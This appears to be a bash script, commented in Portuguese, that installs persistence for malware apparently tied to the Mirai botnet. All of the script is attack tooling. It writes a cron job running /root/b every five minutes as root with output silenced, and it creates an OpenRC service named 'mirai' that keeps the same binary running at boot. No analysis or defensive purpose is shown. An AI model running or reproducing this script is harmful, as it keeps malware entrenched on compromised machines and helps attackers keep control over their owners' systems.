
#!/bin/bash
# instala persistência
mkdir -p /etc/cron.d
echo "*/5 * * * * root /root/b >/dev/null 2>&1" > /etc/cron.d/mirai-persist
chmod 644 /etc/cron.d/mirai-persist

cat > /etc/init.d/mirai <<'EOF'
#!/sbin/openrc-run
name="mirai"
command="/root/b"
command_background=true
pidfile="/run/mirai.pid"
EOF
chmod +x /etc/init.d/mirai
rc-update add mirai default 2>/dev/null || true
